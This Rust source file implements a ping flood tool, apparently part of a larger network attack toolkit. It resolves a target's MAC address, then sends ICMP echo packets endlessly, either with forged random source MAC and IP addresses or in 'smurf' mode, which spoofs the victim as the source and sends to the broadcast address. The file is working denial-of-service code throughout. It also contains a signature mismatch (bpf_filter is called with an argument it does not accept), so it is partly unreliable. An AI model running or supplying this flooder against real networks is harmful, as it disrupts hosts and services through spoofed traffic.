use std::{net::Ipv4Addr, time::Duration, thread};
use crate::arg_parser::{PingArgs, parse_mac};
use crate::generators::RandValues;
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::dissectors::PacketDissector;
use crate::sniffer::PacketSniffer;
use crate::sockets::{Layer2RawSocket, Layer3RawSocket};
use crate::utils::{inline_display, get_first_and_last_ip};



pub struct PingFlooder {
    args:       PingArgs,
    rand:       RandValues,
    builder:    PacketBuilder,
    iface:      String,
    broadcast:  Ipv4Addr,
    pkts_sent:  usize,
}



impl PingFlooder {

    pub fn new(args: PingArgs) -> Self {
        let iface = Self::get_iface(args.target_ip);
        let (first_ip, last_ip) = get_first_and_last_ip(&iface);

        Self {
            rand:       RandValues::new(Some(first_ip), Some(last_ip)),
            builder:    PacketBuilder::new(),
            pkts_sent:  0,
            broadcast:  Self::get_broadcast(&iface),
            iface,
            args,
        }
    }



    fn get_iface(target_ip: Ipv4Addr) -> String {
        IfaceInfo::iface_name_from_ip(target_ip)
    }



    fn get_broadcast(iface: &str) -> Ipv4Addr {
        let (ip, prefix) = Self::get_ip_and_prefix(iface);
        let ip_u32       = u32::from(ip);
        
        let mask = if prefix == 0 { 0 } else { (!0u32) << (32 - prefix) };
        let broadcast_u32 = ip_u32 | !mask;
        Ipv4Addr::from(broadcast_u32)
    }


    fn get_ip_and_prefix(iface: &str) -> (Ipv4Addr, u8) {
        let cidr             = IfaceInfo::iface_network_cidr(iface).unwrap();
        println!("{}",cidr);
        let parts: Vec<&str> = cidr.split('/').collect();
        let ip: Ipv4Addr     = parts[0].parse().unwrap();
        let prefix: u8       = parts[1].parse().unwrap();
        (ip, prefix)
    }



    pub fn execute(&mut self){
        self.set_targe_mac();
        self.send_endlessly();
    }



    fn set_targe_mac(&mut self) {
        if self.args.target_mac.is_some() {
            return;
        }

        self.resolve_target_mac();
    }



    fn resolve_target_mac(&mut self) {
        let my_ip       = IfaceInfo::iface_ip(&self.iface).unwrap();

        let mut sniffer = PacketSniffer::new(self.iface.clone(), self.bpf_filter(my_ip));
        sniffer.start();

        let l3_socket = Layer3RawSocket::new(&self.iface.clone());
        let pkt       = self.builder.icmp_ping(my_ip, self.args.target_ip);
        l3_socket.send_to(pkt, self.args.target_ip);

        thread::sleep(Duration::from_secs(5));
        sniffer.stop();
        let raw_pkts         = sniffer.get_packets();
        let target_mac_str   = PacketDissector::get_src_mac(&raw_pkts[0]);
        let target_mac_vec   = parse_mac(&target_mac_str).unwrap();
        self.args.target_mac = Some(target_mac_vec);
    }



    fn bpf_filter(&self) -> String {
        format!("src host {}", self.args.target_ip)
    }



    fn send_endlessly(&mut self) {
        let l2_socket = Layer2RawSocket::new(&self.iface);

        loop {
            let pkt = self.get_packet();
            l2_socket.send(pkt);
            
            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
    }



    #[inline]
    fn get_packet(&mut self) -> &[u8] {
        let (src_mac, src_ip) = self.get_src_addrs();
        let (dst_mac, dst_ip) = self.get_dst_addrs();

        self.builder.icmp_ping_ether(
            src_mac, src_ip,
            dst_mac, dst_ip
        )
    }



    #[inline]
    fn get_src_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
        if self.args.smurf {
            return (self.args.target_mac.unwrap(), self.args.target_ip);
        }

        (self.rand.get_random_mac(), self.rand.get_random_ip())
    }



    #[inline]
    fn get_dst_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
        if self.args.smurf {
            return ([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], self.broadcast);
        }

        (self.args.target_mac.unwrap(), self.args.target_ip)
    }

}